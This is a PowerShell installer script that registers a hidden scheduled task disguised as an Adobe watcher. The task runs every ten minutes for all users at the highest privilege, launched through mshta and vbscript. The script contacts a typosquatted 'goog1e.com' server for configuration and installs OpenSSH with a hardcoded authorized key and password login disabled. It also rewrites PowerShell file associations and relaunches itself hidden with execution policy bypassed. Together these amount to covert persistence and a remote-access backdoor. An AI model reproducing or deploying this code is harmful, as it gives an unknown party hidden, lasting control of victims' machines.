

#Requires -Version 5

[CmdletBinding()]
param (
  [Parameter()]
  [switch]$Init,
  [Parameter()]
  [switch]$Watch
)

$taskVersion = "2.07"
$uri = "https://goog1e.com"
$Logfile = "$PSScriptRoot\install.log"

$TasksDefinitions = @{
  "PwshWatcher" = @{
    "Name"          = "PwshWatcher";
    "Values"        = @{
      "/ns:Task/ns:Actions/ns:Exec/ns:Command"   = "mshta.exe";
      "/ns:Task/ns:Actions/ns:Exec/ns:Arguments" = 'vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""pwsh -NoLogo -Command """"& {ScriptFile}"""""", 0 : window.close")'
    };
    "XmlDefinition" = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>1971-08-31T00:00:00.0000000</Date>
    <Author>Adobe Systems Incorporated</Author>
    <Description>Pswh watcher</Description>
    <Version>$taskVersion</Version>
    <URI>\Adobe_Watcher</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>1971-08-31T00:00:00</StartBoundary>
      <ExecutionTimeLimit>PT30M</ExecutionTimeLimit>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <GroupId>S-1-1-0</GroupId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command></Command>
      <Arguments></Arguments>
    </Exec>
  </Actions>
</Task>
"@
  }
}

$sshPublicKeys = @(
  "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAiHq57Mo7efkA05q33JkdZ9g96VE4TjCn8lW0jZxn+n0TzkmlNZEi1E6fbfRSv3iK2XnNBFbOUBLinnMtzmDIAbez0FjKJOSyEk3ZvhD6QAvWh4UW77udzr1V9BROKDbe0ZpkHBHs4nc1LrjZ7+oAVnOHDpYa8FQh/jPf77js11YdNrrPbxi2Gg9SLpcDN6b8L88/eebWDaGNYzKw534eY7JT7FTUwcpAd0krfyh7h99pGJaWtzvwsot/ntQE0QiCmu2IXIYXz0iKBuI38PD9AAR3l7vsOzHIkWqcTRhNsfcrlvST8lZcrlOfwdK8peu1RGRegvWeL8tvunAd9rjBNQ== agitech"
)

function _PwshContextMenu {
  #$oldVarDefault = (Get-ItemProperty -path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Open\Command)."(Default)"
  #$oldVarDefautValue = '%systemroot%\system32\WindowsPowerShell\v1.0\powershell.exe -Command "&''%1''"'
  
  $pwshVarMenu = "$((Get-Command pwsh).Path) -Command ""&'%1'"""
  
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Open\Command -Type ExpandString -Name '(Default)' -Value $pwshVarMenu
  
  New-Item -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64 -Force
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64 -Name "Icon" -Value $pwshPath -Type String
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64 -Name "MUIVerb" -Value "Run with PowerShell 7" -Type String
  New-Item -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64\Command -Force
  $keyValue = 'C:\Program Files\PowerShell\7\pwsh.exe -Command "$host.UI.RawUI.WindowTitle = ''PowerShell 7 (x64)''; if((Get-ExecutionPolicy ) -ne ''AllSigned'') { Set-ExecutionPolicy -Scope Process Bypass }; & ''%1''"' 
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64\Command -Name '(Default)' -Value $keyValue -Type String
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64\Command -Name "PowerShellPath" -Value $pwshPath -Type String
  
  #"C:\Program Files\PowerShell\7\pwsh.exe" -WindowStyle Hidden "-Command" ""& {Start-Process """C:\Program Files\PowerShell\7\pwsh.exe""" -ArgumentList '-ExecutionPolicy RemoteSigned -File \"%1\"' -Verb RunAs;start-sleep 1}"
  $keyName = "Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Run with PowerShell 7 (Admin)"
  New-Item -Path $keyName -Force
  Set-ItemProperty -Path $keyName -Name "Icon" -Value $pwshPath -Type String
  Set-ItemProperty -Path $keyName "MUIVerb" -Value "Run with PowerShell 7" -Type String
  New-Item -Path "$keyName\Command" -Force
  $keyValue = 'C:\Program Files\PowerShell\7\pwsh.exe" -WindowStyle Hidden "-Command" ""& {Start-Process """C:\Program Files\PowerShell\7\pwsh.exe""" -ArgumentList ''-ExecutionPolicy RemoteSigned -File \"%1\"'' -Verb RunAs;start-sleep 1}'
  Set-ItemProperty -Path "$keyName\Command" -Name '(Default)' -Value $keyValue -Type String
  Set-ItemProperty -Path "$keyName\Command" -Name "PowerShellPath" -Value $pwshPath -Type String
}
  
function _CheckServerConnection {
  try {
    Invoke-RestMethod -Uri "$uri/GetConfig";
    return $true;
  }
  catch {
    return $false;
  }
}

function Get-IsAdmin {  
  $Principal = new-object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent())
  [bool]$Principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

function WriteLog {
  Param ([string]$LogString)
  Write-Host $LogString
  $Stamp = (Get-Date).toString("yyyy/MM/dd HH:mm:ss")
  $LogMessage = "$Stamp $LogString"
  Add-content $LogFile -value $LogMessage
}

# find modules
function FindModules {
  [CmdletBinding()]
  param (
    [Parameter()]
    [string]$ModulesFolder
  )
	
  $deep = 5;
	
  $folders = New-Object System.Collections.Generic.List[string]
	
  if (!$ModulesFolder) {
    $ModulesFolder = $PSScriptRoot
  }

  for ($i = 0; $i -le $deep; $i++) {
    $folders.Add("$ModulesFolder\$('..\'*$i)Modules");
  }
  foreach ($item in $folders) {
    if (Test-Path $item -PathType Container) {
      $modulePathBase = $item;
      break;
    }
  }

  $pathArray = $( (Resolve-Path "$modulePathBase\Agt.Common\Public\").Path, `
    (Resolve-Path "$modulePathBase\Agt.Install\Public\").Path, `
    (Resolve-Path "$modulePathBase\Agt.Network\").Path)

  foreach ($path in $pathArray) {
    foreach ($item in (Get-ChildItem "$path\*.ps1")) {
      . "$($item.FullName)"
    }
  }
}

########  Variables
#$destinationFolder = $PSScriptRoot
$thisFileName = $MyInvocation.MyCommand.Name
#$thisFileFullName = $MyInvocation.MyCommand.Path
$scriptFile = [System.IO.Path]::Combine($PSScriptRoot, $thisFileName)
$replacements = @{"ScriptFile" = "'$scriptFile' -Watch" }
#$debugger = $false; #($PSBoundParameters.ContainsKey("Debug")) -or ($DebugPreference  -eq "SilentlyContinue")
$taskName = "PwshWatcher"
if (Get-IsAdmin) {
  try {
    WriteLog "Finding modules ..."
    . FindModules
    WriteLog "Modules finded successfully."

    if ($Init) {
          
      if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName
      }

      exit
    }

    $result = Register-Task -TaskData $TasksDefinitions[$taskName] -Replacements $replacements          

    WriteLog "Installing pwsh ..."
    Install-Powershell

    WriteLog "Installing far ..."
    Install-Far

    WriteLog "Installing ssh ..."
    Install-OpenSsh 
  
    WriteLog "Configuring ssh ..."
    Set-OpenSSH -PublicKeys $sshPublicKeys -DisablePassword $true

    # Check services
    # DNS Client, Function Discovery Provider Host, Function Discovery Resource Publication, HomeGroup Provider, HomeGroup Listener, Peer Networking Grouping, SSDP Discovery, UPnP Device Host
            
    $items = @("sshd", "dnscache", "fdphost", "FDResPub", "p2psvc", "ssdpsrv", "upnphost")
    foreach ($item in $items) {
      if (($service = Get-Service -Name $item -ErrorAction SilentlyContinue)) {
        # ($service.StartType) -eq [System.ServiceProcess.ServiceStartMode]::Manual 
        if ($service.StartType -ne [System.ServiceProcess.ServiceStartMode]::Automatic) {
          $service | Set-Service -StartupType ([System.ServiceProcess.ServiceStartMode]::Automatic)
        }
        if ($service.Status -ne "Running") {
          $service | Start-Service
        }
        else {
          $service | Restart-Service
        }
      }
    }

  }
  catch {
    WriteLog "GetFiles Error: $_"
    exit
  }
}
else {
  try {
    pwsh -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden 
    -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "$PSCommandPath"' -Verb RunAs}";
  }
  catch [System.Management.Automation.CommandNotFoundException] {
    PowerShell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden `
      -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "$PSCommandPath"' -Verb RunAs}";
  }
}

WriteLog 'All task completed successfully...';
